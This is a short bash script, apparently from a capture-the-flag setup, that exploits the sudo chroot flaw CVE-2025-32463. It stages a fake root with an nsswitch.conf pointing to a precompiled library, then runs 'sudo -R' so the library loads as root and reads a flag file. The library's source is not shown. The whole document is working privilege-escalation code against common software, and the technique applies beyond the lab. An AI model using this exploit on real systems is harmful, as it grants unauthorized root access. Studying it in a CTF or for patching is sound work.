#!/bin/bash
# Simplified sudo exploit for CTF - CVE-2025-32463
# Uses pre-compiled library to run: cat /flag3

STAGE=$(mktemp -d /tmp/sudowoot.XXXXXX)
cd "${STAGE}" || exit 1

# Copy pre-compiled library
cp /exploit/woot1337.so.2 ./

# Create necessary directory structure
mkdir -p woot/etc
echo "passwd: /woot1337" > woot/etc/nsswitch.conf

# Copy group file to avoid errors
cp /etc/group woot/etc/ 2>/dev/null || echo "root:x:0:" > woot/etc/group

echo "[+] Exploit setup complete, triggering sudo..."
sudo -R woot woot

# Cleanup
cd /
rm -rf "${STAGE}"
